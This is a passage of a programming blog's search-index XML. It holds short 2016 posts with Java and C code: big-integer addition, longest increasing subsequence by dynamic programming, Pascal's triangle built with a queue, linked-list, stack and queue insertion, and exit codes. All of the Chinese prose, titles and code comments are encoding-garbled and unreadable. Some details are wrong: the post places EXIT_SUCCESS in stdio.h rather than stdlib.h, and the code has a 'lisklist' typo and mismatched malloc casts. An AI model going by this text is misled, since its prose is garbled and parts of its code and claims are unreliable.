}</code></pre><p>ÂÅö‰∫ÜÔºåÂ•Ω‰πÖÔºåÊò®Â§©Êôö‰∏ä8.00ÈíüÂÜôÔºåÂÜôÂà∞9.30ÔºåÂàÆÂ§ßÈ£éÔºå‰∏ãÈõ®‰∫ÜÔºåÊàëÊâìÁùÄÈõ®‰ºûÔºåËµ∞Âú®Èõ®‰∏≠„ÄÇÊàë‰ª¨ËøôËæπÔºåÊóÅËæπÁöÑÂüéÂ∏ÇÔºåÂàÆËµ∑‰∫ÜÈæôÂç∑È£éÔºåËøò‰∏ã‰∫ÜÂÜ∞ÈõπÔºåÊ≠ª‰∫Ü98‰∫∫Ôºå‰º§ÊòØ500Â§ö‰∫∫ÔºåÂéÑÂ∞îÂ∞ºËØ∫Áé∞Ë±°ÔºåÂÆ§ÂèãËØ¥ËøôÂíå‰∏ÉÊúà‰∏ãÈõ™ÔºåÊòØ‰∏ÄÊ†∑ÁöÑÔºõ</p><h2 id="ÁÑ∂ÂêéÔºå‰ªäÂ§©‰ªé‰∏äÂçàÔºå10-00Â∑¶Âè≥ÔºåÂÜôÔºåÂÜô‰∫Ü‰∏ÄÈÅçÔºåÁÑ∂ÂêéÂá∫ÈîôÔºåË∞É‰∫ÜÂ•Ω‰πÖÔºå‰∏ÄÁõ¥ÊòØÈîôÔºåÂπ≤ËÑÜÔºåÂ∞±Áù°‰∫Ü‰∏ÄËßâÔºåÈáçÊñ∞ÂÜô‰∫Ü‰∏ÄÈÅçÔºåÂêÉÈ•≠Âéª"><a href="#ÁÑ∂ÂêéÔºå‰ªäÂ§©‰ªé‰∏äÂçàÔºå10-00Â∑¶Âè≥ÔºåÂÜôÔºåÂÜô‰∫Ü‰∏ÄÈÅçÔºåÁÑ∂ÂêéÂá∫ÈîôÔºåË∞É‰∫ÜÂ•Ω‰πÖÔºå‰∏ÄÁõ¥ÊòØÈîôÔºåÂπ≤ËÑÜÔºåÂ∞±Áù°‰∫Ü‰∏ÄËßâÔºåÈáçÊñ∞ÂÜô‰∫Ü‰∏ÄÈÅçÔºåÂêÉÈ•≠Âéª" class="headerlink" title="ÁÑ∂ÂêéÔºå‰ªäÂ§©‰ªé‰∏äÂçàÔºå10.00Â∑¶Âè≥ÔºåÂÜôÔºåÂÜô‰∫Ü‰∏ÄÈÅçÔºåÁÑ∂ÂêéÂá∫ÈîôÔºåË∞É‰∫ÜÂ•Ω‰πÖÔºå‰∏ÄÁõ¥ÊòØÈîôÔºåÂπ≤ËÑÜÔºåÂ∞±Áù°‰∫Ü‰∏ÄËßâÔºåÈáçÊñ∞ÂÜô‰∫Ü‰∏ÄÈÅçÔºåÂêÉÈ•≠Âéª"></a>ÁÑ∂ÂêéÔºå‰ªäÂ§©‰ªé‰∏äÂçàÔºå10.00Â∑¶Âè≥ÔºåÂÜôÔºåÂÜô‰∫Ü‰∏ÄÈÅçÔºåÁÑ∂ÂêéÂá∫ÈîôÔºåË∞É‰∫ÜÂ•Ω‰πÖÔºå‰∏ÄÁõ¥ÊòØÈîôÔºåÂπ≤ËÑÜÔºåÂ∞±Áù°‰∫Ü‰∏ÄËßâÔºåÈáçÊñ∞ÂÜô‰∫Ü‰∏ÄÈÅçÔºåÂêÉÈ•≠Âéª</h2><p>java</p><hr><pre><code>import java.util.Scanner;import java.math.BigInteger;public class Main {      public static void main(String []args){        BigInteger a,b;        int T;        Scanner input=new Scanner(System.in);        T=input.nextInt();        for(int i=1;i&lt;=T;i++){            a=input.nextBigInteger();            b=input.nextBigInteger();            System.out.println(&quot;Case&quot;+&quot; &quot;+i+&quot;:&quot;);            System.out.println(a+&quot; + &quot;+b+&quot; = &quot;+a.add(b));        }           }} </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂçïË∞ÉÈÄíÂ¢ûÊúÄÈïøÂ≠êÂ∫èÂàó-Á¨¨‰∏Ä‰∏™dpÔºàÂä®ÊÄÅËßÑÂàíÔºâ</title>
      <link href="/2016/06/21/%E5%8D%95%E8%B0%83%E9%80%92%E5%A2%9E%E6%9C%80%E9%95%BF%E5%AD%90%E5%BA%8F%E5%88%97-%E7%AC%AC%E4%B8%80%E4%B8%AAdp%EF%BC%88%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%EF%BC%89/"/>
      <url>/2016/06/21/%E5%8D%95%E8%B0%83%E9%80%92%E5%A2%9E%E6%9C%80%E9%95%BF%E5%AD%90%E5%BA%8F%E5%88%97-%E7%AC%AC%E4%B8%80%E4%B8%AAdp%EF%BC%88%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>‰πüËÆ∏‰Ω†ÂíåÊàë‰∏ÄÊ†∑ÔºåÂàöÊé•Ëß¶Âä®ÊÄÅËßÑÂàíÔºå‰∏ÄÂ§¥ÈõæÊ∞¥ÔºåÁúã‰πüÁúã‰∏çÊáÇÔºå‰ΩÜ‰Ωú‰∏∫ËøáÊù•‰∫∫ÔºåÂÜô‰∏ã‰∏ÄÁÇπ‰∏úË•øÔºå‰∏ÄÊñπÈù¢ÔºåÂ¢ûÂä†Ëá™Â∑±ÁöÑËÆ∞ÂøÜÔºåÂè¶‰∏ÄÊñπÈù¢ÔºåÁªô‰Ω†‰ª¨ÁÇπÂπ≤Ë¥ß„ÄÇdpÔºàdynamic<br>programmingÔºâÔºõ<br><strong>1.</strong> Âä®ÊÄÅËßÑÂàíÔºåÂ∞±ÊòØÊääËÆ°ÁÆóËøáÁ®ã‰∏≠‰∫ßÁîüÁöÑ‰∏≠Èó¥ÁªìÊûúÈùôÊÄÅÂú∞‰øùÂ≠òËµ∑Êù•ÔºåÂêéÈù¢ÂÜçÁî®Âà∞Ëøô‰∫õ‰∏≠Èó¥ÁªìÊûúÁöÑÊó∂ÂÄôÂ∞±‰∏çÁî®ÂÜçÁÆó‰∏ÄÈÅçÔºåËÄåÊòØÁõ¥Êé•ËØªÂèñ„ÄÇ<br><strong>2.</strong> Âä®ÊÄÅËßÑÂàíÊòØÈÄíÂΩíÔºåÊòØÁºìÂ≠òÔºåÊòØ <strong>Áî®Á©∫Èó¥Êù•Êç¢ÂèñÊó∂Èó¥</strong> „ÄÇ<br><strong>3.</strong> ÂéüÈóÆÈ¢òÁöÑËß£Â¶Ç‰ΩïÁî±Â≠êÈóÆÈ¢òÁöÑËß£ÁªÑÂêàËÄåÊàê„ÄÇ</p><hr><p>**‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑÊÄùÁª¥ËøáÁ®ãÂ∫îËØ•ÊòØÔºö<br>1.OK Ëøô‰∏™ÈóÆÈ¢òÈúÄË¶ÅÁî®Âà∞ÈÄíÂΩíÁöÑÊÄùÊÉ≥‚Ä¶.<br>2.ÂºÄÂßãÂÜôÈÄíÂΩí‚Ä¶<br>3.Âìá ÁÆóÂØπ‰∫Ü..<br>4. ËØ∂ÔºüÊÄé‰πàÊÑüËßâÊúâÂæàÂ§ösub problemË¢´ÈáçÂ§çËÆ°ÁÆó‰∫Ü Âπ≤ Â§çÊùÇÂ∫¶Âà∞‰∫Ü 2^N<br>5. Â•ΩÂêß dp‰∏Ä‰∏ã ÂºÑ‰∏™tableÊàñËÄÖÊòØtreeÊù•memoization‰∏Ä‰∏ã‚Ä¶<br>6. ‰ºòÂåñÊàêÂäü<br>(ÂΩìÁÑ∂Â¶ÇÊûú‰Ω†ÊêûÁ´ûËµõ‰ª•‰∏äËøáÁ®ã‰∏çÈÄÇÂêà‰Ω† Â¶ÇÊûú‰Ω†Âè™ÊòØÁ∫ØÁ≤πËßâÂæóÁêÜËß£dpÊòØ‰∏Ä‰ª∂ÊúâË∂£ÁöÑ‰∫ãÊÉÖÊàñËÄÖÂØπÁÆóÊ≥ïÊä±ÊúâÁ∫ØÁ≤πÁöÑÂÖ¥Ë∂£ ÈÇ£‰πàÊàëËßâÂæó‰ª•‰∏äÁöÑËøáÁ®ãÂæàÈÄÇÂêà‰Ω†)</p><p>‰ΩúËÄÖÔºöPusheen Cherish<br>ÈìæÊé•Ôºö <a href="http://www.zhihu.com/question/23995189/answer/36008790" target="_blank" rel="noopener"> http://www.zhihu.com/question/23995189/answer/36008790</a><br>Êù•Ê∫êÔºöÁü•‰πé<br>Ëëó‰ΩúÊùÉÂΩí‰ΩúËÄÖÊâÄÊúâ„ÄÇÂïÜ‰∏öËΩ¨ËΩΩËØ∑ËÅîÁ≥ª‰ΩúËÄÖËé∑ÂæóÊéàÊùÉÔºåÈùûÂïÜ‰∏öËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§Ñ„ÄÇ**<br>Â¶ÇÊûú‰Ω†‰ª¨ÂÖàËØ¶ÁªÜ‰∫ÜËß£ÔºåÂÖ•Èó®Âä®ÊÄÅËßÑÂàíÔºåÈÇ£Â∞±ÁúãÁúãÁü•‰πéËøô‰∏™È°µÈù¢<br><a href="http://www.zhihu.com/question/23995189" target="_blank" rel="noopener"> http://www.zhihu.com/question/23995189</a></p><hr><p>‰∏ãÈù¢Ë¥¥‰ª£Á†Å</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;char a[10001];int dp[10000];int f(int len){    int i,j,ans,m;//ansÊòØËøô‰∏™Â≠óÁ¨¶‰∏≤‰∏≠ÊúÄÈïøÂ≠êÂ∫èÂàóÁöÑÂÄº    dp[0]=1,ans=1;//Â¶ÇÊûúËøô‰∏™Â≠óÁ¨¶‰∏≤Â≠òÂú®ÔºåÈÇ£Â∞±Â≠òÂú®dp[0],ans[1];    for(i=1;i&lt;len;i++)//ÈÅçÂéÜÊï∞ÁªÑ    {        m=0;//Â¶ÇÊûúa[i]ÊØîÂâçÈù¢ÁöÑÊâÄÊúâÈÉΩÂ∞èÔºådp[i]=1;        for(j=0;j&lt;i;j++)//Ëé∑Âæó‰ªéi=0,Âà∞i=i‰πãÈó¥a[i]ÂèØ‰ª•ËøûÁª≠ÈÄíÂ¢ûÁöÑÂÄº        {            if(dp[j]&gt;m&amp;&amp;a[j]&lt;a[i])                m=dp[j];        }        dp[i]=m+1;//ÊâæÂà∞ÈÇ£‰∏™i‰πãÂâçÁöÑÊúÄÂ§ßÂÄº,Âπ∂Âä†1        if(dp[i]&gt;ans)//‰∏çÊñ≠Ëé∑ÂæóÊúÄÂ§ßÂÄº            ans=dp[i];    }    return ans;}int main(){    int n,len;    scanf(&quot;%d&quot;,&amp;n);    while(n--)    {        scanf(&quot;%s&quot;,&amp;a);        len=strlen(a);        printf(&quot;%d\n&quot;,f(len));    }    return 0;}</code></pre><p>ÂæàÂ§ö‰∏úË•øÔºåÈÉΩÊòØÊé•Âäõ‰∏ãÂéªÁöÑÔºåÂÜôÂçöÂÆ¢ÔºåÂ∞±ÊòØ‰∏ÄÁßçÊé•ÂäõÔºådp‰πüÊòØ‰∏ÄÁßçÊé•ÂäõÔºåÂêéËæàÔºåÂ•ΩÂ•ΩÂä†Ê≤πÔºåÊàë‰πüÂä†Ê≤π</p><hr><p>ÈáçÁÇπÁ†îÁ©∂Âá†Á±ªÁªèÂÖ∏ÈóÆÈ¢ò<br>Âú®ÁêÜËß£‰∫ÜÂä®ÊÄÅËßÑÂàíÁöÑ‰∏Ä‰∫õÊ¶ÇÂøµ‰πãÂêéÔºåË¶ÅËÉΩÂÅöÂà∞Áî®Âä®ÊÄÅËßÑÂàíËß£È¢òÔºåÂÖ∂‰∏≠ÈáçÁÇπÁ†îÁ©∂Âá†Á±ªÁªèÂÖ∏ÈóÆÈ¢òÊòØÂæàÊúâÂøÖË¶ÅÁöÑ„ÄÇÂ∞±ËøëÂá†Âπ¥ÁöÑÊØîËµõÈ¢òÁõÆËÄåË®ÄÔºåÂæÄÂæÄÈÉΩÂèØ‰ª•ËΩ¨Âåñ‰∏∫Êàë‰ª¨Â∑≤Áü•ÁöÑÁªèÂÖ∏Ê®°Âûã„ÄÇ‰∏ãÈù¢‰ªãÁªçÂá†‰∏™ÁªèÂÖ∏Ê®°ÂûãÔºö<br>1„ÄÅÊåâÁä∂ÊÄÅÁ±ªÂûãÂàÜ<br>ÁºñÂè∑ÔºàÈïøÂ∫¶ÔºâÂä®ÊÄÅËßÑÂàíÁ±ªÔºåÈ¢òÂ∫ìÔºöÊúÄÈïø‰∏ç‰∏ãÈôçÂ≠êÂ∫èÂàóÔºõÊã¶Êà™ÂØºÂºπÔºànoip99ÔºâÔºõËä±Â∫óÊ©±Á™óÂ∏ÉÁΩÆÔºàioi99Ôºâ„ÄÇ<br>Âå∫Èó¥Âä®ÊÄÅËßÑÂàíÁ±ªÔºåÈ¢òÂ∫ìÔºöÁü≥Â≠êÂêàÂπ∂ÔºõÈÇÆÂ±ÄÔºàioi2000Ôºâ„ÄÇ<br>ÂùêÊ†áÂä®ÊÄÅËßÑÂàíÁ±ªÔºåÈ¢òÂ∫ìÔºöÊ£ãÁõòÂàÜÂâ≤Ôºànoi99Ôºâ„ÄÇ<br>Êï∞ËΩ¥Âä®ÊÄÅËßÑÂàíÁ±ªÔºåÈ¢òÂ∫ìÔºö01ËÉåÂåÖÔºõË£ÖÁÆ±ÈóÆÈ¢òÔºànoip01Ôºâ„ÄÇ<br>Ê†ëÂûãÂä®ÊÄÅËßÑÂàíÁ±ªÔºåÈ¢òÂ∫ìÔºöÈÄâËØæÔºàctsc97ÔºâÔºåË¥™È£üÁöÑ‰πùÂ§¥ÈæôÔºànoi02Ôºâ„ÄÇ<br>ÈõÜÂêàÂä®ÊÄÅËßÑÂàíÔºàÁä∂ÊÄÅÂéãÁº©ÔºâÁ±ªÔºåÈ¢òÂ∫ìÔºöË¥≠Áâ©Ôºàioi95Ôºâ„ÄÇ<br>2„ÄÅÊåâËΩ¨ÁßªÊñπÂºèÂàÜ<br>Â≠òÂú®ÊÄßÔºö01ÁªüËÆ°Ôºàctsc99ÔºâÔºõCatalanÊï∞<br>ÂàíÂàÜÈóÆÈ¢òÔºöÂàÜÂâ≤ÁÇπÊúâÂ∫èÁ±ªÔºåÈ¢òÂ∫ìÔºöÊàêÁª©ÊúÄÂ§ßÔºànoip00Ôºâ<br>ÂàÜÂâ≤ÁÇπÊó†Â∫èÁ±ªÔºåÈ¢òÂ∫ìÔºöÁü≥Â≠êÂêàÂπ∂Ôºànoi95ÔºâÔºõÂä†ÂàÜ‰∫åÂèâÊ†ëÔºànoip03ÔºâÔºõÊã¨Âè∑Â∫èÂàó<br>3„ÄÅË∑ØÂæÑÈóÆÈ¢òÔºöÊñπÊ†ºÂèñÊï∞Ôºànoip00ÔºâÔºõËä±Â∫óÊ©±Á™óÂ∏ÉÁΩÆÔºàioi99Ôºâ<br>ÈÄöËøáËøô‰∫õÁªèÂÖ∏Ê®°ÂûãÁöÑÁ†îÁ©∂ÔºåÂèØ‰ª•‰ªéÂ§öËßíÂ∫¶‰∫ÜËß£Â¶Ç‰ΩïËøõË°åÁä∂ÊÄÅÁöÑÂàíÂàÜÔºåÁÑ∂ÂêéÂèçÂ§çÁêÜËß£ÊØè‰∏Ä‰∏™ËΩ¨ÁßªÊñπÁ®ãÁöÑÊÑè‰πâÔºåÂú®ÊΩúÁßªÈªòÂåñ‰πã‰∏≠ÔºåÊàë‰ª¨‰æøÂèØ‰ª•ËææÂà∞Âä®ÊÄÅËßÑÂàíÁöÑÂü∫Êú¨Ë¶ÅÊ±ÇÔºåÂÅöÂà∞‰ª•‰∏çÂèòÂ∫î‰∏áÂèò„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Âä®ÊÄÅËßÑÂàí </tag>
            
            <tag> ÈÄíÂΩí </tag>
            
            <tag> dp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Êù®Ëæâ‰∏âËßíÈòüÂàóÊñπÂºè</title>
      <link href="/2016/06/14/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92%E9%98%9F%E5%88%97%E6%96%B9%E5%BC%8F/"/>
      <url>/2016/06/14/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92%E9%98%9F%E5%88%97%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<pre><code>void YanghuiTriangle(int N){    int i,n,x,temp;    linkqueue q;    initqueue(&amp;q);    enterqueue(&amp;q,1);//Á¨¨‰∏ÄË°åÂÖ•Èòü    for(n=2;n&lt;=N;n++)//Áî±Á¨¨iË°åËΩ¨Êç¢‰∏∫i-1Ë°å    {           enterqueue(&amp;q,1);//Á¨¨nË°åÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÂÖ•Èòü        for(i=1;i&lt;=n-2;i++)/*Â∞Ün-1Ë°åÔºåÊúân-1‰∏™ÂÖÉÁ¥†*/        {            deletequeue(&amp;q,&amp;temp);//Âà†Èô§ÂΩìÂâçÈòüÂàó‰∏≠Á¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Ôºà1Ôºâ            printf(&quot;%d\t&quot;,temp);/*‰ªéÁ¨¨1‰∏™Êï∞Âà∞Á¨¨n-2‰∏™Êï∞ËæìÂá∫*/            gettop(q,&amp;x);            temp+=x;//Ëé∑ÂæóÂΩìÂâçÈòüÂàó‰∏≠Á¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÂÄºÔºåÂπ∂Â∞ÜÂÖ∂Áõ∏Âä†Ôºà2Ôºâ            //Ôºà1ÔºâÔºà2ÔºâÂπ∂‰∏çÁõ∏Âêå            enterqueue(&amp;q,temp);//ÂàÜÂà´Â∞ÜnË°åÁöÑÔºå‰ªéÁ¨¨‰∫å‰∏™Êï∞Âà∞Á¨¨n-1‰∏™                                //Êï∞ÂÖ•ÈòüÂàó        }        deletequeue(&amp;q,&amp;x);//Â∞Ün-1Ë°åÁöÑÔºåÊúÄÂêé‰∏Ä‰∏™Êï∞ÔºåÂà†Èô§ÔºåÂπ∂ËæìÂá∫        printf(&quot;%d\t&quot;,x);        enterqueue(&amp;q,1);//Â∞ÜÁ¨¨nË°åÁöÑÔºåÊúÄÂêé‰∏Ä‰∏™Êï∞ÔºåËøõÂÖ•ÈòüÂàó‰∏≠        printf(&quot;\n&quot;);    }}</code></pre><p>ËÆ≤‰∫ÜÂæàÂ§öÔºåÂ∞ÜÈòüÂàóÁöÑÂÖÉÁ¥†ÁöÑËÆ∞ÂΩïÂÜô‰∏ãÊù•<br>ÂÜôÂá†‰∏™<br>===„ÄãÔºàÈòüÂ§¥ÊñπÂêëÔºâ<br>1 3 3 1 1 2 1 1 1 1<br>‚Äî‚ë£‚Äî‚Äî‚ë¢‚Äî‚ë°-‚ë†</p><p>ÂêÉÈ•≠Âéª‰∫Ü</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÈòüÂàó </tag>
            
            <tag> Êï∞ÊçÆÁªìÊûÑ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂéãÈìæÊ†à‰∏éËøõÈìæÈòüÂàóÂíåÂàõÂª∫Á∫øÊÄßË°®ÁöÑÂÖ≥Á≥ª</title>
      <link href="/2016/06/12/%E5%8E%8B%E9%93%BE%E6%A0%88%E4%B8%8E%E8%BF%9B%E9%93%BE%E9%98%9F%E5%88%97%E5%92%8C%E5%88%9B%E5%BB%BA%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
      <url>/2016/06/12/%E5%8E%8B%E9%93%BE%E6%A0%88%E4%B8%8E%E8%BF%9B%E9%93%BE%E9%98%9F%E5%88%97%E5%92%8C%E5%88%9B%E5%BB%BA%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>È¶ñÂÖàÔºåÊù•ÂÜô‰∏ã<br><strong>1.Á∫øÊÄßË°®ÁöÑÂ§¥ÊèíÊ≥ï</strong></p><pre><code>void CreateFromHead(linklist *h){    lisklist *s;    char c;    c=getchar();    while(c!=&apos;$&apos;)    {        s=(linklist *)malloc(sizeof(linklist));        s-&gt;data=c;        s-&gt;next=h-&gt;next;        h-&gt;next=s;        c=getchar();    }}</code></pre><p><em>ËøõÊ†àÁöÑ‰ª£Á†Å</em></p><pre><code>int push(LinkStack *top,StackElemType x){    LinkStack *new;    new=(LinkStack)malloc(sizeof(LinkStack));    if(new==NULL)return FALSE;    new-&gt;data=x;    new-&gt;next=top-&gt;next;    top-&gt;next=new;    return OK;}</code></pre><p><strong>2.Á∫øÊÄßË°®ÁöÑÂ∞æÊèíÊ≥ï</strong></p><pre><code>void CreateFromTail(LinkList *h){    LinkList *tail,*new;    tail=h;    char c=getchar();    while(c!=&apos;$&apos;)    {        new=(linklist *)malloc(sizeof(linklist));        new-&gt;data=c;        tail-&gt;next=new;        tail=new;        c=getchar();            }    tail-&gt;next=NULL;    }</code></pre><p><em>ÈìæÈòüÂàóÁöÑÂÖ•Èòü</em></p><pre><code>int EnterQueue(LinkQueue *q,QueueElemType x){    LinkQueueNode *newnode;    newnode=(LinkQueue*)malloc(sizeof(LinkQueue));    if(newnode==NULL)    return FALSE;    newnode-&gt;data=x;    newnode-&gt;next=NULL;    q-&gt;rear-&gt;next=newnode;    q-&gt;rear=newnode;    return OK;  }</code></pre><p>Ê†à‰∏éÈòüÂàóÁöÑÂá∫Áé∞ÊàñËÄÖËØ¥ÊòØÂøÖÁÑ∂Ôºå‰πüÊòØÂÅ∂ÁÑ∂</p>]]></content>
      
      
      
        <tags>
            
            <tag> cËØ≠Ë®Ä </tag>
            
            <tag> Á∫øÊÄßË°® </tag>
            
            <tag> Ê†à </tag>
            
            <tag> ÈòüÂàó </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exit(0),exit(1),exit(-1)ÁöÑÂå∫Âà´</title>
      <link href="/2016/05/09/exit(0),exit(1),exit(-1)%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2016/05/09/exit(0),exit(1),exit(-1)%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>exit(0)Ê≠£Â∏∏<br>exit(1)Âíåexit(-1)‰∏çÊ≠£Â∏∏1Âíå-1‰∏™‰∫∫‰π†ÊÉØ  </p><p>EXIT_SUCCESSË°®Á§∫Ê≠£Â∏∏ÔºåEXIT_FAILUREË°®Á§∫Â§±Ë¥•ÔºåÂÆö‰πâÂú®stdio.hÈáå„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
